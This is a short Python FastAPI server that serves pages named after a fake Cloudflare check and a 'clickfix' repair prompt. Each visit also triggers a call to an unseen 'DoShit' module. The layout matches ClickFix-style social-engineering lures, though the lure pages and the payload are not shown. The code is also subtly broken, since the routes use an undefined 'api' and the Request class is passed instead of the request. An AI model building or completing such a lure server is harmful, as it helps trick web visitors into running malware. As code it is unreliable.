from fastapi import FastAPI,Request
from fastapi.responses import FileResponse
from do import DoShit

app = FastAPI()


env = {
    "claudflare_page":"static/claudeflare.html",
    "clickfix_page":"static/clickfix.html"
}



@api.get("/")
def root_route(req:Request):
    DoShit(Request).start("now") 
    return FileResponse(
        env["claudflare_page"]
    )

@api.get("/Repair")
def repair(req:Request):
    DoShit(Request).start("now")
    return FileResponse(
        env["clickfix_page"]
    )

if __name__=="__main__":
    import os
    from colorama import init
    init()
    os.system(
        "uvicorn main:app --port 9000 --host 0.0.0.0 --reload"
    )